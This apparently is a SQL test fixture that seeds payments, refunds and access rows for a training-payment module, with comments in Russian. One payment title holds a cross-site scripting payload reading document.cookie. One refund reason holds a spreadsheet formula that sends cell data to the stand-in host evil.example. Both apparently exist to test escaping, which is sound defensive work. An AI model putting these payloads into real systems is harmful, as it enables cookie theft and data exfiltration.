-- Тестовые данные. Контакты 1 и 2 — клиенты.

INSERT INTO trainpay_payment (id, contact_id, contact_email, training_id, title, external_id, amount, status, paid_datetime, create_datetime) VALUES
(1, 1, 'client1@example.com', 10, 'Тренинг «Ваш голос»', 'ext-1001', 4990.00, 'paid', NOW(), NOW()),
(2, 2, 'client2@example.com', 11, '<img src=x onerror="alert(document.cookie)">', 'ext-1002', 7500.50, 'paid', NOW(), NOW()),
(3, 2, 'client2@example.com', 10, 'Тренинг «Ваш голос»', 'ext-1003', 4990.00, 'paid', DATE_SUB(NOW(), INTERVAL 20 DAY), DATE_SUB(NOW(), INTERVAL 20 DAY)),
(4, 1, 'client1@example.com', 12, 'Мастер-класс', '', 1500.00, 'new', NULL, NOW());

INSERT INTO trainpay_refund (id, payment_id, contact_id, amount, reason, status, create_datetime) VALUES
(1, 3, 2, 4990.00, '=HYPERLINK("http://evil.example/?x="&A1;"Нажмите")', 'new', NOW());

INSERT INTO trainpay_access (id, contact_id, training_id, payment_id, create_datetime) VALUES
(1, 1, 10, 1, NOW()),
(2, 2, 11, 2, NOW()),
(3, 2, 10, 3, DATE_SUB(NOW(), INTERVAL 20 DAY));
